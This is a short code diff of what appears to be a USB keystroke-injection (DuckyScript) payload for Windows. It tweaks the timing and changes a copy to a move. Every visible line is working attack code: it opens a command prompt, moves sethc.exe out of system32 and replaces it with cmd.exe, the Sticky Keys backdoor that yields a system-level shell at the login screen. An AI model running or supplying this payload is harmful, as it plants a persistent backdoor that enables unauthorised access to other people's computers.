@@ -7,12 +7,12 @@ REM <---------------------------------------------------------------------------
 
 DELAY 500
 GUI r
-DELAY 500
+DELAY 1000
 STRING cmd
-DELAY 500
+DELAY 1000
 ENTER
 DELAY 1000
-STRING copy c:\windows\system32\sethc.exe c:\
+STRING move c:\windows\system32\sethc.exe c:\
 ENTER
 DELAY 500
 STRING copy /y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
